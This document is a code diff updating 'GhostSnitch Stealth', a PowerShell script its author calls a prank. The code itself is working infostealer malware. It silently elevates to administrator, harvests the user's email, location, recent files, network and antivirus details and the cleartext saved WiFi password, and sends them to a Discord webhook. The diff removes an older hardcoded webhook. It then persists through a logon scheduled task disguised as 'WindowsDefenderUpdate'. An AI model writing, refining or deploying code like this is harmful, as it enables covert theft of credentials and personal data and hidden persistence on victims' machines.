@@ -1,132 +1,204 @@
 ####################################################################################################
-# Title       : GhostSnitch
-# Version     : 1.3 (Stealth)
+# Title       : GhostSnitch Stealth
+# Version     : 1.4
 # Author      : I am TBJr
-# Description : Curiosity was the spark, but roasting you is the flame. Stealth delivery first.
+# Description : Curiosity was the spark, but roasting you is the flame. Admin-elevated delivery.
 ####################################################################################################
 
-# Auto-elevate if not running as Administrator
-If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
-    [Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell -Verb runAs -ArgumentList "-ExecutionPolicy Bypass -File `\"$PSCommandPath`\""
+# --- Configuration -----------------------------------------------------------
+$webhookUrl  = 'REPLACE_ME'   # Discord webhook URL — set before deploying
+$prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
+$targetAlias = $env:COMPUTERNAME
+# -----------------------------------------------------------------------------
+
+# Auto-elevate to Administrator if not already running elevated.
+# When launched via irm|iex there is no $PSCommandPath, so we write the script
+# content to a temp file and elevate that file instead.
+If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+        [Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $tempScript = "$env:TEMP\gs_stealth_runner.ps1"
+    if ($MyInvocation.MyCommand.Path) {
+        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $tempScript -Force
+    } else {
+        $MyInvocation.MyCommand.ScriptBlock.ToString() | Out-File -FilePath $tempScript -Encoding UTF8 -Force
+    }
+    Start-Process powershell -Verb runAs `
+        -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$tempScript`""
     exit
 }
 
 function Get-FullName {
     try {
-        $fullName = (net user $env:username | Select-String -Pattern "Full Name").ToString().Split(":")[1].Trim()
-    } catch {
-        $fullName = $env:username
-    }
-    return $fullName
+        $n = (net user $env:username 2>$null | Select-String "Full Name").ToString().Split(":")[1].Trim()
+        if ([string]::IsNullOrWhiteSpace($n)) { $n = $env:username }
+        return $n
+    } catch { return $env:username }
 }
-$fullName = Get-FullName
 
-function Get-UserInfo { "User: $env:USERNAME on $env:COMPUTERNAME" }
+function Get-GeoInfo {
+    try {
+        $r = (Invoke-WebRequest 'https://ipwho.is/' -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
+        return "$($r.city), $($r.region), $($r.country)  |  ISP: $($r.connection.isp)"
+    } catch { return "Geolocation unavailable" }
+}
+
+function Get-UserInfo   { "User: $env:USERNAME on $env:COMPUTERNAME" }
+
 function Get-Email {
     try {
-        $email = (gpresult /z | Select-String -Pattern "\S+@\S+").Matches.Value
+        $email = (gpresult /z 2>$null | Select-String -Pattern "\b\S+@\S+\.\S+\b").Matches.Value | Select-Object -First 1
+        if (-not $email) { return "No email found" }
         return "Email: $email"
     } catch { return "Email not found" }
 }
-function Get-OS { (Get-CimInstance Win32_OperatingSystem).Caption }
+
+function Get-OS         { (Get-CimInstance Win32_OperatingSystem).Caption }
+
 function Get-Uptime {
     $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-    $up = New-TimeSpan -Start $boot -End (Get-Date)
+    $up   = New-TimeSpan -Start $boot -End (Get-Date)
     return "$($up.Days) days, $($up.Hours) hrs"
 }
+
 function Get-DriveStats {
     (Get-PSDrive -PSProvider FileSystem | ForEach-Object {
         "$($_.Name): $([int]($_.Used/1GB))GB used / $([int]($_.Free/1GB))GB free"
     }) -join "`n"
 }
+
 function Get-RecentFiles {
-    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
-            Sort-Object LastWriteTime -Descending | Select-Object -First 5 |
-            ForEach-Object { $_.Name } | Out-String
+    (Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
+        Sort-Object LastWriteTime -Descending | Select-Object -First 5 |
+        ForEach-Object { $_.Name }) -join ", "
 }
+
 function Get-USB {
-    try { (Get-PnpDevice -Class 'USB').FriendlyName -join ", " } catch { "No USB info found" }
+    try { (Get-PnpDevice -Class 'USB' -ErrorAction Stop).FriendlyName -join ", " }
+    catch { "No USB info found" }
 }
+
 function Get-BitLocker {
     try {
-        (Get-BitLockerVolume | Select-Object MountPoint, ProtectionStatus | ForEach-Object {
+        (Get-BitLockerVolume -ErrorAction Stop | ForEach-Object {
             "$($_.MountPoint): $($_.ProtectionStatus)"
         }) -join ", "
     } catch { "BitLocker status unknown" }
 }
+
 function Get-NetworkInfo {
-    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike '169.*' }).IPAddress | Select-Object -First 1
-    $mac = (Get-NetAdapter | Where-Object Status -eq 'Up').MacAddress | Select-Object -First 1
-    return "Local IP: $ip, MAC: $mac"
+    $ip  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+            Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
+            Select-Object -First 1).IPAddress
+    $mac = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
+    "Local IP: $ip, MAC: $mac"
 }
+
 function Get-Antivirus {
-    try { (Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct).displayName -join ", " } catch { "No antivirus info" }
+    try { (Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct -ErrorAction Stop).displayName -join ", " }
+    catch { "No antivirus info" }
 }
+
 function Get-TopProcesses {
-    Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5 |
-            ForEach-Object { "$($_.ProcessName): $([math]::Round($_.WorkingSet/1MB,1))MB" } | Out-String
+    (Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5 |
+        ForEach-Object { "$($_.ProcessName): $([math]::Round($_.WorkingSet/1MB,1))MB" }) -join ", "
 }
+
 function Get-RAM {
     try {
-        $RAM = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
-        $RAM = [int]$RAM
-        if ($RAM -lt 4) { "$RAM GB? Powered by hopes and prayers." }
-        elseif ($RAM -lt 8) { "$RAM GB? Barely enough to load your regrets." }
-        elseif ($RAM -lt 16) { "$RAM GB? Gamer vibes. With lag." }
-        else { "$RAM GB? Respect. But no firewall? Lol." }
+        $RAM = [int]((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
+        if ($RAM -lt 4)  { return "$RAM GB? Powered by hopes and prayers." }
+        if ($RAM -lt 8)  { return "$RAM GB? Barely enough to load your regrets." }
+        if ($RAM -lt 16) { return "$RAM GB? Gamer vibes. With lag." }
+        return "$RAM GB? Respect. But no firewall? Lol."
     } catch { "RAM detection failed." }
 }
+
 function Get-PubIP {
-    try { (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim() } catch { "No public IP" }
+    try { (Invoke-WebRequest 'https://ipinfo.io/ip' -UseBasicParsing -TimeoutSec 5).Content.Trim() }
+    catch { "No public IP" }
 }
+
 function Get-WifiPass {
     try {
-        $ssid = (netsh wlan show interface | Select-String ' SSID ').ToString().Split(":")[1].Trim()
-        $pass = (netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content').ToString().Split(":")[1].Trim()
+        $ssid = (netsh wlan show interface 2>$null | Select-String '^\s+SSID\s+:').ToString().Split(":")[1].Trim()
+        if ([string]::IsNullOrEmpty($ssid)) { return "Not connected to WiFi." }
+        # Running as admin at this point, so key extraction should succeed
+        $pass = (netsh wlan show profile name="$ssid" key=clear 2>$null | Select-String 'Key Content').ToString().Split(":")[1].Trim()
         "$ssid password: $pass"
     } catch { "No WiFi pass found" }
 }
+
 function Get-PasswordAge {
     try {
-        $line = (net user $env:UserName | Select-String "Password last set").ToString()
-        $days = (New-TimeSpan -Start $line.Split(':')[1].Trim() -End (Get-Date)).Days
+        $line = (net user $env:UserName 2>$null | Select-String "Password last set").ToString()
+        $days = (New-TimeSpan -Start ([datetime]$line.Split(':')[1].Trim()) -End (Get-Date)).Days
         "$days days since last password set"
     } catch { "Password age unknown" }
 }
 
-# Send log to Discord immediately
-$webhook = 'https://discord.com/api/webhooks/1364536515954348032/3H6tkezlhYibD9CB6qAE62ON__BTvWcGEtuihmz7NylPZOhDYcjO0gq8BOuS-lLvDBBg'
-$payload = @{
-    username = "👻 GhostSnitch (Stealth)"
-    content = "🕵️ Stealth log received from `$env:COMPUTERNAME"
-    embeds = @(@{
-        title = "GhostSnitch Report for $fullName"
-        color = 65280
-        fields = @(
-            @{ name = "🧑‍💻 User Info"; value = (Get-UserInfo); inline = $true },
-            @{ name = "📧 Email Roast"; value = (Get-Email); inline = $false },
-            @{ name = "🖥️ OS"; value = (Get-OS); inline = $true },
-            @{ name = "⏱️ Uptime"; value = (Get-Uptime); inline = $true },
-            @{ name = "💽 Drives"; value = (Get-DriveStats); inline = $false },
-            @{ name = "🗃️ Recent Files"; value = (Get-RecentFiles); inline = $false },
-            @{ name = "🔌 USB Devices"; value = (Get-USB); inline = $false },
-            @{ name = "🔐 BitLocker"; value = (Get-BitLocker); inline = $true },
-            @{ name = "🌐 Network"; value = (Get-NetworkInfo); inline = $true },
-            @{ name = "🛡️ Antivirus"; value = (Get-Antivirus); inline = $false },
-            @{ name = "🔄 Top Processes"; value = (Get-TopProcesses); inline = $false },
-            @{ name = "💾 RAM Roast"; value = (Get-RAM); inline = $true },
-            @{ name = "🌍 Public IP"; value = (Get-PubIP); inline = $true },
-            @{ name = "📶 WiFi Password"; value = (Get-WifiPass); inline = $false },
-            @{ name = "🔒 Password Age"; value = (Get-PasswordAge); inline = $false }
-        )
-        timestamp = (Get-Date).ToString("o")
-    })
-}
-Invoke-RestMethod -Uri $webhook -Method Post -Body (ConvertTo-Json $payload -Depth 10) -ContentType 'application/json'
+# ---- Collect all data once --------------------------------------------------
+$fullName   = Get-FullName
+$userInfo   = Get-UserInfo
+$emailInfo  = Get-Email
+$osInfo     = Get-OS
+$uptime     = Get-Uptime
+$drives     = Get-DriveStats
+$recent     = Get-RecentFiles
+$usb        = Get-USB
+$bitlocker  = Get-BitLocker
+$network    = Get-NetworkInfo
+$av         = Get-Antivirus
+$procs      = Get-TopProcesses
+$ramRoast   = Get-RAM
+$pubIP      = Get-PubIP
+$wifiRoast  = Get-WifiPass
+$passAge    = Get-PasswordAge
+$geo        = Get-GeoInfo
 
-# Create scheduled task for persistence
-$dest = "$env:APPDATA\ghostsnitch.ps1"
-Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $dest -Force
-$task = "schtasks /create /f /sc onlogon /tn GhostSnitch /tr 'powershell -w h -NoP -NonI -Ep Bypass -File `\"$dest`\"'"
-Invoke-Expression $task
+# ---- Send report to Discord -------------------------------------------------
+if ($webhookUrl -ne 'REPLACE_ME') {
+    $payload = @{
+        username = "GhostSnitch (Stealth)"
+        content  = "Stealth log received | ID: ``$prankId``"
+        embeds   = @(@{
+            title  = "GhostSnitch Report for $fullName"
+            color  = 65280
+            fields = @(
+                @{ name = "Prank ID";      value = $prankId;    inline = $true  },
+                @{ name = "Target";        value = $targetAlias; inline = $true  },
+                @{ name = "Location";      value = $geo;        inline = $false },
+                @{ name = "User Info";     value = $userInfo;  inline = $true  },
+                @{ name = "Email";         value = $emailInfo; inline = $false },
+                @{ name = "OS";            value = $osInfo;    inline = $true  },
+                @{ name = "Uptime";        value = $uptime;    inline = $true  },
+                @{ name = "Drives";        value = $drives;    inline = $false },
+                @{ name = "Recent Files";  value = $recent;    inline = $false },
+                @{ name = "USB Devices";   value = $usb;       inline = $false },
+                @{ name = "BitLocker";     value = $bitlocker; inline = $true  },
+                @{ name = "Network";       value = $network;   inline = $true  },
+                @{ name = "Antivirus";     value = $av;        inline = $false },
+                @{ name = "Top Processes"; value = $procs;     inline = $false },
+                @{ name = "RAM";           value = $ramRoast;  inline = $true  },
+                @{ name = "Public IP";     value = $pubIP;     inline = $true  },
+                @{ name = "WiFi Password"; value = $wifiRoast; inline = $false },
+                @{ name = "Password Age";  value = $passAge;   inline = $false }
+            )
+            timestamp = (Get-Date).ToString("o")
+        })
+    }
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post `
+            -Body (ConvertTo-Json $payload -Depth 10) `
+            -ContentType 'application/json' -ErrorAction Stop
+    } catch {}
+}
+
+# ---- Persist ----------------------------------------------------------------
+$dest = "$env:APPDATA\Microsoft\ghostsnitch_s.ps1"
+if ($MyInvocation.MyCommand.Path) {
+    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $dest -Force -ErrorAction SilentlyContinue
+} else {
+    $MyInvocation.MyCommand.ScriptBlock.ToString() | Out-File -FilePath $dest -Encoding UTF8 -Force
+}
+schtasks /create /f /sc onlogon /tn "WindowsDefenderUpdate" `
+    /tr "powershell -w h -NoP -NonI -Ep Bypass -File `"$dest`"" 2>$null | Out-Null
